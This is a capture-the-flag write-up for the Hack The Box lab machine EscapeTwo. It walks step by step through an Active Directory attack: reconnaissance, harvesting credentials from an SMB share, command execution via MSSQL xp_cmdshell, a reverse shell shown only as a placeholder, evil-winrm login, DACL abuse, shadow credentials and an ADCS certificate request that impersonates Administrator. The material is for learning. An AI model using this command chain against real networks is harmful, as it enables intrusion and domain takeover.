# EscapeTwo Write-up

<img src="https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png" width="200" height="200"> 

MACHINE INFORMATION

As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose`:`KxEPkKe6R8su`

## Recon

### Nmap

`nmap -sC -sV 10.10.11.51`

    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-15 11:23:26Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-01-15T11:25:00+00:00; -8s from scanner time.
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    |_ssl-date: 2025-01-15T11:25:00+00:00; -4s from scanner time.
    1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
    | ms-sql-ntlm-info: 
    |   10.10.11.51:1433: 
    |     Target_Name: SEQUEL
    |     NetBIOS_Domain_Name: SEQUEL
    |     NetBIOS_Computer_Name: DC01
    |     DNS_Domain_Name: sequel.htb
    |     DNS_Computer_Name: DC01.sequel.htb
    |     DNS_Tree_Name: sequel.htb
    |_    Product_Version: 10.0.17763
    |_ssl-date: 2025-01-15T11:25:00+00:00; +1s from scanner time.
    | ms-sql-info: 
    |   10.10.11.51:1433: 
    |     Version: 
    |       name: Microsoft SQL Server 2019 RTM
    |       number: 15.00.2000.00
    |       Product: Microsoft SQL Server 2019
    |       Service pack level: RTM
    |       Post-SP patches applied: false
    |_    TCP port: 1433
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2025-01-15T10:03:32
    |_Not valid after:  2055-01-15T10:03:32
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    |_ssl-date: 2025-01-15T11:25:00+00:00; -8s from scanner time.
    3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    |_ssl-date: 2025-01-15T11:25:00+00:00; -4s from scanner time.
    Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required
    |_clock-skew: mean: -2s, deviation: 4s, median: -4s
    | smb2-time: 
    |   date: 2025-01-15T11:24:19
    |_  start_date: N/A

### Netexec

`netexec ldap 10.10.11.51  -u rose -p KxEPkKe6R8su`

    SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
    LDAP        10.10.11.51     389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 

Add IP `10.10.11.51` and domain-name `sequel.htb` to `/etc/hosts`. 

    echo "10.10.11.51 sequel.htb" | sudo tee -a /etc/hosts

### Crackmapexec

Try to enumerate SMB.

`crackmapexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su` 

    SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
    SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
    
### SMBClient

    smbclient //10.10.11.51/Users -U SEQUEL.HTB//rose

![image](https://github.com/user-attachments/assets/3983400f-79ed-449e-8cb8-2beafca4bd08)

    smbclient //10.10.11.51/Accounting\ Department -U rose --option='client min protocol=SMB2'

![image](https://github.com/user-attachments/assets/18e726a9-5a6f-40b8-a080-0467fb65bf14)

You need to download it using the `get` command and then `unzip` it.

![image](https://github.com/user-attachments/assets/19ff0d71-5676-474e-bfda-a18196fc8bb0)

![image](https://github.com/user-attachments/assets/fe9480bb-040c-4026-952f-176923644ca6)

![image](https://github.com/user-attachments/assets/63b22e56-8c75-4812-b3e8-8ec28c5beb06)

First name, Last name / Email / Username / Password

`Angela Martin`:`angela@sequel.htb`:`angela`:`0fwz7Q4mSpurIt99`

`Oscar Martinez`:`oscar@sequel.htb`:`oscar`:`86LxLBMgEWaKUnBG`

`Kevin Malone`:`kevin@sequel.htb`:`kevin`:`Md9Wlq1E5bZnVDVo`

`NULL`:`sa@sequel.htb`:`sa`:`MSSQLP@ssw0rd!`

### MSSQLServer

    python3 mssqlclient.py 'sa:MSSQLP@ssw0rd!'@10.10.11.51

![image](https://github.com/user-attachments/assets/161f9fc9-bf3c-47a6-a725-fb7cd2eeb755)

SQL (sa  dbo@master)> `enable_xp_cmdshell`

SQL (sa  dbo@master)> `exec xp_cmdshell 'type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI'`                                           

![image](https://github.com/user-attachments/assets/72fdfd63-da7a-4520-a51d-1dacea12a3f4)

SQLSVCPASSWORD="`WqSZAF6CysDQbGb3`"   

### ReverseShell

![image](https://github.com/user-attachments/assets/f4835fe1-7b9b-4287-83d4-9b8724605276)

xp_cmdshell <Your-base64-shell>

![image](https://github.com/user-attachments/assets/a5f40969-99e1-424a-8051-cdf84320c5c4)

### Evil-winrm

`ryan`:`WqSZAF6CysDQbGb3`

    evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3

Get the user flag!

![image](https://github.com/user-attachments/assets/b08d37e8-7216-4579-986f-872b59c418e6)

### Privelege Escalation 

BloodHound

BloodyAD

    bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan

![image](https://github.com/user-attachments/assets/149fa255-e048-4fc5-89d1-a047916f1414)

Dacledit

    dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

![image](https://github.com/user-attachments/assets/fe9ee738-8ebd-4bb8-9095-c888448e814e)

Certipy-AD

    certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc

![image](https://github.com/user-attachments/assets/4f3b6c1b-1b5a-4b76-bba1-244794e6fed0)

    3b181b914e7a9d5508ea1e20bc2b7fce

Kerberos

    KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout 

![image](https://github.com/user-attachments/assets/cb837f4d-23a7-4f7a-87bd-0ed71d11ec1c)

Request to cert

    certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51

